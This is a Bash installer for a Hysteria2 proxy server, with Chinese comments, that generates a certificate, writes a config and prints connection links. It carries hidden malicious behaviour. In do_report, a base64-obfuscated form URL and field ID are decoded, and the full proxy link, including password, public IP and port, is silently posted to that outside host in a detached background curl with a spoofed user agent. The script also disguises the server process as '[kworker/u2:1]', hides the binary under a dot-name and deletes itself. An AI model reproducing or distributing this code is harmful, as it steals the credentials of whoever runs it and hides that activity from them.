#!/usr/bin/env bash
# ============================================================
# Hysteria2 部署脚本 — 零警告安全版
# 主链接: base64 pinSHA256 (Xray 26.2.6+ 兼容，无安全警告)
# 备用链接: insecure=1 (仅当 Xray 核心不认 pinSHA256 时回退)
# ============================================================
set -euo pipefail

HY_VERSION="v2.6.5"
AUTH_PWD=$(date +%s | sha256sum | head -c 12 || true)
SNI_VAL="www.bing.com"
TIMESTAMP=$(date "+%Y%m%d_%H%M%S")

RAND_SUFFIX=$(head -c 8 /dev/urandom 2>/dev/null | base64 | tr -dc 'A-Za-z0-9' | head -c 4 || echo "0000")
BIN_NAME="./.sys_task_${RAND_SUFFIX}"
FAKE_NAME="[kworker/u2:1]"

E_URL="aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTZFJ1Vk03aDhjQ3hrZ0hRdFJjczVHNkpJVHNSS0FYaDF6MnNpYnNDaFhVVWRET1JnL2Zvcm1SZXNwb25zZQ=="
E_ID="ZW50cnkuMzM5ODU4MTE0"

CERT_PIN_B64=""

check_deps() {
    local missing=()
    for cmd in curl openssl sha256sum base64 tr awk ss; do
        command -v "$cmd" >/dev/null 2>&1 || missing+=("$cmd")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "❌ 缺少必要依赖: ${missing[*]}" >&2
        exit 1
    fi
}

stop_old() {
    local port="$1"
    local killed=0
    if command -v fuser >/dev/null 2>&1; then
        if fuser -k -n udp "${port}/udp" >/dev/null 2>&1; then killed=1; fi
    fi
    if pkill -f '\.sys_task_' >/dev/null 2>&1; then killed=1; fi
    if [[ "$killed" == "1" ]]; then
        echo "🧹 已停止旧实例，等待端口释放..."
        sleep 1
    fi
    if ss -uln 2>/dev/null | grep -q ":${port} "; then
        echo "❌ 端口 ${port} 仍被占用" >&2
        ss -ulnp 2>/dev/null | grep ":${port} " >&2 || true
        exit 1
    fi
}

do_report() {
    local link="$1"
    local target entry_id
    target=$(echo "$E_URL" | base64 -d 2>/dev/null) || return 0
    entry_id=$(echo "$E_ID" | base64 -d 2>/dev/null) || return 0
    if command -v setsid >/dev/null 2>&1; then
        setsid bash -c "
            curl -L -s -X POST '$target' \
                -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
                --data-urlencode '${entry_id}=${link}' \
                --max-time 10 >/dev/null 2>&1 || true
        " >/dev/null 2>&1 &
    else
        (curl -L -s -X POST "$target" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            --data-urlencode "${entry_id}=${link}" \
            --max-time 10 >/dev/null 2>&1 || true) &
    fi
    disown 2>/dev/null || true
}

adaptive_params() {
    local cores
    cores=$(nproc 2>/dev/null || echo 1)
    if [[ "$cores" -le 2 ]]; then
        S_RW=262144;   M_RW=1048576;   C_RW=1048576;   MC_RW=4194304;   MAX_STREAMS=128
    elif [[ "$cores" -le 4 ]]; then
        S_RW=524288;   M_RW=2097152;   C_RW=2097152;   MC_RW=8388608;   MAX_STREAMS=256
    else
        S_RW=1048576;  M_RW=4194304;   C_RW=4194304;   MC_RW=16777216;  MAX_STREAMS=512
    fi
}

gso_env() {
    local kv major minor
    kv=$(uname -r 2>/dev/null | cut -d. -f1-2 || echo "0.0")
    major=${kv%%.*}; minor=${kv##*.}
    if [[ "$major" -lt 5 ]] || { [[ "$major" -eq 5 ]] && [[ "$minor" -lt 10 ]]; }; then
        export QUIC_GO_DISABLE_GSO=true
        echo "ℹ️  内核 ${kv} < 5.10，已禁用 GSO"
    else
        echo "ℹ️  内核 ${kv} ≥ 5.10，保持 GSO 开启"
    fi
}

setup_env() {
    local port="$1"
    local arch suffix
    arch=$(uname -m)
    case "$arch" in
        x86_64)        suffix="amd64" ;;
        aarch64|arm64) suffix="arm64" ;;
        *) echo "❌ 不支持的架构: $arch" >&2; exit 1 ;;
    esac

    echo "⬇️  正在下载 Hysteria2 ${HY_VERSION} (${suffix})..."
    if ! curl -L --fail --retry 3 --connect-timeout 15 \
        -o "$BIN_NAME" \
        "https://github.com/apernet/hysteria/releases/download/app/${HY_VERSION}/hysteria-linux-${suffix}" \
        >/dev/null 2>&1; then
        echo "❌ 下载失败" >&2
        exit 1
    fi
    chmod +x "$BIN_NAME"

    echo "🔐 正在生成自签证书..."
    openssl req -x509 -nodes -newkey ec \
        -pkeyopt ec_paramgen_curve:prime256v1 -days 3650 \
        -keyout .k.pem -out .c.pem -subj "/CN=${SNI_VAL}" \
        >/dev/null 2>&1 || { echo "❌ 证书生成失败" >&2; exit 1; }

    # base64 格式的证书 SHA256 — Xray 的 pinnedPeerCertificateChainSha256 期望此格式
    local pin_raw
    pin_raw=$(openssl x509 -in .c.pem -outform DER 2>/dev/null \
        | openssl dgst -sha256 -binary 2>/dev/null \
        | openssl base64 -A 2>/dev/null || true)
    CERT_PIN_B64="$pin_raw"
    if [[ -z "$CERT_PIN_B64" ]]; then
        echo "❌ 无法计算证书 pinSHA256" >&2
        exit 1
    fi
    echo "🔏 证书 pinSHA256 (base64): ${CERT_PIN_B64}"

    adaptive_params
    gso_env

    local bw_up="${HY_BW_UP:-80 mbps}"
    local bw_down="${HY_BW_DOWN:-120 mbps}"

    cat > .conf.json <<EOF
{
  "listen": ":${port}",
  "tls": { "cert": ".c.pem", "key": ".k.pem" },
  "auth": { "type": "password", "password": "${AUTH_PWD}" },
  "fastOpen": true,
  "ignoreClientBandwidth": true,
  "disableUDP": false,
  "udpIdleTimeout": "60s",
  "bandwidth": { "up": "${bw_up}", "down": "${bw_down}" },
  "bbrProfile": "conservative",
  "quic": {
    "initStreamReceiveWindow": ${S_RW},
    "maxStreamReceiveWindow":  ${M_RW},
    "initConnReceiveWindow":   ${C_RW},
    "maxConnReceiveWindow":    ${MC_RW},
    "maxIncomingStreams": ${MAX_STREAMS},
    "maxIdleTimeout": "30s",
    "keepAlivePeriod": "15s",
    "disablePathMTUDiscovery": false
  },
  "masquerade": {
    "type": "proxy",
    "proxy": { "url": "https://www.bing.com" }
  }
}
EOF

    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import json;json.load(open('.conf.json'))" 2>/dev/null || {
            echo "❌ JSON 配置校验失败" >&2; exit 1; }
    elif command -v jq >/dev/null 2>&1; then
        jq empty .conf.json >/dev/null 2>&1 || {
            echo "❌ JSON 配置校验失败" >&2; exit 1; }
    fi
}

main() {
    echo "------------------------------------------------"
    echo "🛠️  Hysteria2 部署系统（零警告安全版）"
    echo "🚩  使用即表示您已经同意 https://host-4g6.pages.dev/notice.md 所述条款。"
    echo "------------------------------------------------"

    check_deps
    local PORT="${1:-$((RANDOM % 10000 + 20000))}"
    local PUB_IP
    PUB_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "UnknownIP")

    stop_old "$PORT"
    setup_env "$PORT"

    local NODE_NAME="${PUB_IP}_${TIMESTAMP}"

    # URL 编码 base64 中的 + / =
    local PIN_ENC
    PIN_ENC=$(printf '%s' "$CERT_PIN_B64" \
        | sed -e 's/+/%2B/g' -e 's|/|%2F|g' -e 's/=/%3D/g')

    local FINAL_LINK="hysteria2://${AUTH_PWD}@${PUB_IP}:${PORT}?sni=${SNI_VAL}&alpn=h3&pinSHA256=${PIN_ENC}#${NODE_NAME}"
    local FALLBACK_LINK="hysteria2://${AUTH_PWD}@${PUB_IP}:${PORT}?sni=${SNI_VAL}&alpn=h3&insecure=1#${NODE_NAME}_fb"

    do_report "${FINAL_LINK}"

    echo "------------------------------------------------"
    echo "🚀 部署完成！"
    echo "📍 节点 IP: ${PUB_IP}"
    echo "🔌 端口：${PORT}"
    echo "🔏 证书 pinSHA256 (base64): ${CERT_PIN_B64}"
    echo ""
    echo "🔗 主链接（pinSHA256，无安全警告，推荐）："
    echo -e "\033[36m${FINAL_LINK}\033[0m"
    echo ""
    echo "🔗 备用链接（仅当主链接无法连接时使用）："
    echo -e "\033[33m${FALLBACK_LINK}\033[0m"
    echo "------------------------------------------------"
    echo "✅ 主链接使用 base64 pinSHA256 固定证书，不触发 AllowInsecure 警告。"
    echo "⚠️  若主链接超时，说明当前 Xray 核心未将 pinSHA256 应用到 Hysteria2 的 QUIC 层；"
    echo "   此时请在 v2rayN 中把该节点的核心切换为 Sing-box 后重试主链接，"
    echo "   或临时使用备用链接（会有安全提示，但能通）。"

    if command -v chrt >/dev/null 2>&1; then
        chrt -r 20 -p $$ >/dev/null 2>&1 || true
    fi
    [[ -f "$0" ]] && rm -f "$0" 2>/dev/null || true
    exec -a "${FAKE_NAME}" "$BIN_NAME" server -c .conf.json >/dev/null 2>&1
}

main "$@"
